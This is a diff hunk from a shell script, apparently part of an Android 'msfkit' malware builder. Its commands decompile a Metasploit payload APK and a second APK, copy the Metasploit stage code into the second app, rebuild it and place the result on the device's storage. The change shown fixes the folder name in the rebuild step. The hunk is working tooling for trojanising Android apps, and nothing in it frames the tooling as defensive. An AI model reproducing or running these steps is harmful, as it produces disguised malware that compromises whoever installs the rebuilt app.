@@ -786,7 +786,7 @@ apktool d G45_Hacking.apk -o G45Hacking && rm -fr G45_Hacking.apk
 apktool d payload.apk -o payload && rm -fr payload.apk && cd
 cd msfkit/Malware && rm -fr G45Hacking/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage G45Hacking/smali/com/metasploit/stage && cd
-cd msfkit/Malware && apktool b keyloager -o G45_Hacking.apk && cd
+cd msfkit/Malware && apktool b G45Hacking -o G45_Hacking.apk && cd
 cd msfkit/Malware && mv -f G45_Hacking.apk /sdcard && cd
 cd msfkit/Malware && rm -fr * && cd
 cd msfkit && rm -fr Payload
